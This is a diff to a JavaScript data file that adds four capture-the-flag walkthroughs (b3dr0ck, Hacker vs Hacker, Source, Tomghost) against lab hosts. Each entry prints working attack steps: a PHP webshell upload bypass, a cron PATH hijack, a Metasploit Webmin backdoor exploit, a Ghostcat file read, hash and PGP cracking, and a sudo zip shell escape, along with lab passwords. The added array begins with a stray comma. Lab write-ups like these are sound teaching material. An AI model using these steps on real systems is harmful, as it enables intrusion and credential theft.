@@ -817,6 +817,304 @@ find / -perm -4000 -type f 2>/dev/null
 </div>
 `
   },
+,
+{
+id: "b3dr0ck",
+title: "b3dr0ck",
+difficulty: "easy",
+flags: 4,
+techniques: ["TLS certificate recovery", "certutil abuse", "Encoding chain"],
+content: `
+<h1>b3dr0ck &mdash; Full Walkthrough</h1>
+<div class="writeup-meta">
+<span class="meta-item"><strong>Target:</strong> 10.48.129.19</span>
+<span class="meta-item"><strong>OS:</strong> Linux</span>
+<span class="meta-item"><strong>Flags:</strong> 4</span>
+</div>
+<div class="flags-grid">
+<div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">SSH as barney</span></div>
+<div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">TLS service &rarr; certutil</span></div>
+<div class="flag-card"><span class="flag-num">03</span><span class="flag-desc">su to fred</span></div>
+<div class="flag-card"><span class="flag-num">04</span><span class="flag-desc">Crack MD5 hash &rarr; su root</span></div>
+</div>
+<hr>
+<h2>Phase 1: Reconnaissance</h2>
+<pre><code>nmap -sC -sV 10.48.129.19 -oN nmap_scan.txt</code></pre>
+<table>
+<tr><th>Port</th><th>Service</th></tr>
+<tr><td>22/tcp</td><td>SSH (OpenSSH 8.2p1)</td></tr>
+<tr><td>80/tcp</td><td>HTTP (nginx 1.18.0, redirect &rarr; 4040)</td></tr>
+<tr><td>9009/tcp</td><td>Custom service (pichat?)</td></tr>
+<tr><td>4040/tcp</td><td>HTTPS web server</td></tr>
+<tr><td>54321/tcp</td><td>SSL secure login service</td></tr>
+</table>
+<h2>Phase 2: Foothold &mdash; Barney</h2>
+<h3>Recover Certificates from Port 9009</h3>
+<pre><code>nc 10.48.129.19 9009
+# Ask for: key
+# Ask for: certificate</code></pre>
+<p>Save to <code>client.key</code> and <code>client.crt</code>.</p>
+<h3>Get Password via Port 54321</h3>
+<pre><code>socat stdio ssl:10.48.129.19:54321,cert=client.crt,key=client.key,verify=0
+# Type: password</code></pre>
+<p>Password: <strong>YabbaDabbaD0000!</strong></p>
+<h3>SSH as Barney</h3>
+<pre><code>ssh barney@10.48.129.19
+cat barney.txt</code></pre>
+<h2>Phase 3: Lateral Movement &mdash; Barney &rarr; Fred</h2>
+<pre><code>sudo -l
+(ALL : ALL) /usr/bin/certutil
+sudo /usr/bin/certutil fred "Fred Flintstone"</code></pre>
+<p>Save cert/key, connect as Fred on port 54321, get password.</p>
+<pre><code>su fred
+cat fred.txt</code></pre>
+<h2>Phase 4: Privilege Escalation &mdash; Fred &rarr; Root</h2>
+<pre><code>sudo -l
+(ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
+(ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
+sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
+# Output hash, crack via CrackStation</code></pre>
+<p>Crack MD5 hash &rarr; <strong>flintstonesvitamins</strong></p>
+<pre><code>su root
+cat /root/root.txt</code></pre>
+<hr>
+<h2>Vulnerability Chain</h2>
+<div class="chain">
+<span class="chain-step">Port 9009 open</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">TLS keys leaked</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">SSH access</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">certutil sudo</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">Encode chain</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step current">Root shell</span>
+</div>
+<div class="takeaways">
+<h3>Key Takeaways</h3>
+<ul>
+<li><strong>Custom TLS services without auth</strong> are gold mines for credential harvesting</li>
+<li><strong>Certificate-based auth</strong> allows user impersonation if you can generate certs</li>
+<li><strong>Always check encoding chains</strong> &mdash; base64 &rarr; base32 &rarr; base64</li>
+</ul>
+</div>
+`
+},
+{
+id: "hacker-vs-hacker",
+title: "Hacker vs Hacker",
+difficulty: "easy",
+flags: 2,
+techniques: ["File upload bypass", "Cron PATH hijack"],
+content: `
+<h1>Hacker vs Hacker &mdash; Full Walkthrough</h1>
+<div class="writeup-meta">
+<span class="meta-item"><strong>Target:</strong> 10.48.139.103</span>
+<span class="meta-item"><strong>OS:</strong> Linux</span>
+<span class="meta-item"><strong>Flags:</strong> 2</span>
+</div>
+<div class="flags-grid">
+<div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">File upload bypass &rarr; RCE via webshell</span></div>
+<div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Cron PATH hijack (malicious pkill)</span></div>
+</div>
+<hr>
+<h2>Phase 1: Reconnaissance</h2>
+<pre><code>nmap -sC -sV 10.48.139.103 -oN nmap_scan.txt</code></pre>
+<table>
+<tr><th>Port</th><th>Service</th></tr>
+<tr><td>22/tcp</td><td>SSH (OpenSSH 8.2p1)</td></tr>
+<tr><td>80/tcp</td><td>HTTP (Apache 2.4.41)</td></tr>
+</table>
+<h2>Phase 2: File Upload Bypass</h2>
+<p>The website is <strong>RecruitSec</strong> with a CV upload form. HTML comments reveal a <code>/cvs/</code> directory. Accessing <code>/upload.php</code> shows the vulnerable source code.</p>
+<pre><code>if (!strpos($target_file, ".pdf")) {
+echo "Only PDF CVs are accepted.";
+}</code></pre>
+<p>Create and upload a PHP webshell with <code>.pdf</code> in the middle of the filename:</p>
+<pre><code>echo '<?php system($_GET["cmd"]); ?>' > shell.pdf.php
+curl -F "fileToUpload=@shell.pdf.php" http://10.48.139.103/upload.php
+curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=id"
+# uid=33(www-data)</code></pre>
+<h2>Phase 3: User Flag</h2>
+<pre><code>curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt"</code></pre>
+<h2>Phase 4: SSH Access</h2>
+<p>Bash history reveals the previous hacker's tracks:</p>
+<pre><code>./cve.sh
+vi /etc/cron.d/persistence
+echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123" | passwd</code></pre>
+<p>SSH with password <strong>thisistheway123</strong>.</p>
+<h2>Phase 5: Privilege Escalation &mdash; Cron PATH Hijack</h2>
+<p>The persistence cron has a misconfigured PATH:</p>
+<pre><code>PATH=/home/lachlan/bin:/bin:/usr/bin
+* * * * * root ... && pkill -9 -t pts/$f</code></pre>
+<p><code>pkill</code> is called without an absolute path, and <code>/home/lachlan/bin</code> is writable:</p>
+<pre><code>ssh lachlan@10.48.139.103 \
+'echo "#!/bin/bash\ncat /root/root.txt > /tmp/rf.txt" > /home/lachlan/bin/pkill \
+&& chmod +x /home/lachlan/bin/pkill'
+# Wait for cron, then:
+ssh lachlan@10.48.139.103 'cat /tmp/rf.txt'</code></pre>
+<hr>
+<h2>Vulnerability Chain</h2>
+<div class="chain">
+<span class="chain-step">strpos() bypass</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">Webshell</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">Cred leak</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">SSH access</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step current">PATH hijack &rarr; root</span>
+</div>
+<div class="takeaways">
+<h3>Key Takeaways</h3>
+<ul>
+<li><strong>strpos() returning 0 is falsy</strong> &mdash; place .pdf mid-filename to bypass</li>
+<li><strong>Always check .bash_history</strong> &mdash; previous attackers leave traces</li>
+<li><strong>Relative paths in cron</strong> with writable PATH dirs are instant root</li>
+</ul>
+</div>
+`
+},
+{
+id: "source",
+title: "Source",
+difficulty: "easy",
+flags: 2,
+techniques: ["Webmin RCE", "CVE-2019-15107"],
+content: `
+<h1>Source &mdash; Full Walkthrough</h1>
+<div class="writeup-meta">
+<span class="meta-item"><strong>Target:</strong> 10.48.131.168</span>
+<span class="meta-item"><strong>OS:</strong> Linux</span>
+<span class="meta-item"><strong>Flags:</strong> 2</span>
+</div>
+<div class="flags-grid">
+<div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">Webmin RCE &mdash; /home/dark/user.txt</span></div>
+<div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">Webmin RCE (root) &mdash; /root/root.txt</span></div>
+</div>
+<hr>
+<h2>Phase 1: Reconnaissance</h2>
+<pre><code>nmap -sC -sV 10.48.131.168 -oN nmap_scan.txt</code></pre>
+<table>
+<tr><th>Port</th><th>Service</th></tr>
+<tr><td>22/tcp</td><td>SSH (OpenSSH 7.6p1)</td></tr>
+<tr><td>10000/tcp</td><td>HTTP (MiniServ 1.890 &mdash; Webmin httpd)</td></tr>
+</table>
+<p>Webmin 1.890 is vulnerable to <strong>CVE-2019-15107</strong> &mdash; a backdoor inserted via supply chain attack on SourceForge.</p>
+<h2>Phase 2: Exploitation &mdash; CVE-2019-15107</h2>
+<pre><code>msfconsole
+msf6 > use exploit/linux/http/webmin_backdoor
+msf6 > set RHOSTS 10.48.131.168
+msf6 > set RPORT 10000
+msf6 > set SSL true
+msf6 > set LHOST 192.168.192.149
+msf6 > run
+
+[+] The target is vulnerable.
+[+] Command shell session 1 opened
+whoami
+root</code></pre>
+<p>Webmin runs as root &mdash; <strong>no privilege escalation needed</strong>.</p>
+<h2>Phase 3: Flag Capture</h2>
+<pre><code>cat /root/root.txt
+cat /home/dark/user.txt</code></pre>
+<p>The compromised <code>webmin_1.890_all.deb</code> package sits in dark's home directory.</p>
+<hr>
+<h2>Vulnerability Chain</h2>
+<div class="chain">
+<span class="chain-step">Port 10000 open</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">Webmin 1.890</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">CVE-2019-15107</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step current">Root shell</span>
+</div>
+<div class="takeaways">
+<h3>Key Takeaways</h3>
+<ul>
+<li><strong>Webmin 1.890 was supply-chain compromised</strong> &mdash; real-world backdoor on SourceForge</li>
+<li><strong>Not all services need a privesc step</strong> &mdash; check what user the service runs as</li>
+<li><strong>Always verify software versions</strong> against known CVE databases</li>
+</ul>
+</div>
+`
+},
+{
+id: "tomghost",
+title: "Tomghost",
+difficulty: "easy",
+flags: 2,
+techniques: ["Ghostcat CVE-2020-1938", "PGP cracking", "sudo zip"],
+content: `
+<h1>Tomghost &mdash; Full Walkthrough</h1>
+<div class="writeup-meta">
+<span class="meta-item"><strong>Target:</strong> 10.48.163.2</span>
+<span class="meta-item"><strong>OS:</strong> Linux</span>
+<span class="meta-item"><strong>Flags:</strong> 2</span>
+</div>
+<div class="flags-grid">
+<div class="flag-card"><span class="flag-num">01</span><span class="flag-desc">Ghostcat file read &rarr; SSH as skyfuck</span></div>
+<div class="flag-card"><span class="flag-num">02</span><span class="flag-desc">PGP decrypt &rarr; sudo zip privesc</span></div>
+</div>
+<hr>
+<h2>Phase 1: Reconnaissance</h2>
+<pre><code>nmap -sC -sV 10.48.163.2</code></pre>
+<table>
+<tr><th>Port</th><th>Service</th></tr>
+<tr><td>22/tcp</td><td>SSH (OpenSSH 7.2p2)</td></tr>
+<tr><td>53/tcp</td><td>tcpwrapped</td></tr>
+<tr><td>8009/tcp</td><td>AJP13 (Apache Jserv Protocol v1.3)</td></tr>
+<tr><td>8080/tcp</td><td>HTTP (Apache Tomcat 9.0.30)</td></tr>
+</table>
+<h2>Phase 2: Ghostcat &mdash; CVE-2020-1938</h2>
+<p>Tomcat 9.0.30 is vulnerable to unauthenticated file read via AJP on port 8009.</p>
+<pre><code>python3 ghostcat.py 10.48.163.2 -p 8009 -f /WEB-INF/web.xml
+# Credentials: skyfuck:8730281lkjlkjdqlksalks</code></pre>
+<h2>Phase 3: SSH as skyfuck</h2>
+<pre><code>ssh skyfuck@10.48.163.2
+# Files: credential.pgp, tryhackme.asc</code></pre>
+<h2>Phase 4: Crack PGP Passphrase</h2>
+<pre><code>gpg2john tryhackme.asc > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+# Passphrase: alexandru</code></pre>
+<h2>Phase 5: Decrypt Credentials</h2>
+<pre><code>gpg --decrypt credential.pgp
+# merlin's password obtained</code></pre>
+<h2>Phase 6: Privilege Escalation &mdash; sudo zip</h2>
+<pre><code>sudo -l
+(root : root) NOPASSWD: /usr/bin/zip
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/bash"
+cat /root/root.txt</code></pre>
+<hr>
+<h2>Vulnerability Chain</h2>
+<div class="chain">
+<span class="chain-step">AJP port open</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">Ghostcat exploit</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">SSH access</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">PGP crack</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step">Lateral move</span>
+<span class="chain-arrow">&rarr;</span>
+<span class="chain-step current">sudo zip &rarr; root</span>
+</div>
+<div class="takeaways">
+<h3>Key Takeaways</h3>
+<ul>
+<li><strong>AJP exposed is critical</strong> &mdash; CVE-2020-1938 enables unauthenticated file reads</li>
+<li><strong>PGP keys with weak passphrases</strong> are as bad as weak passwords</li>
+<li><strong>sudo zip</strong> can be abused for root shell via GTFOBins</li>
+</ul>
+</div>
+`
+}
 ];
 
 // ===========================
@@ -891,3 +1189,4 @@ backBtn.addEventListener('click', () => {
 // ===========================
 
 renderCards();
+
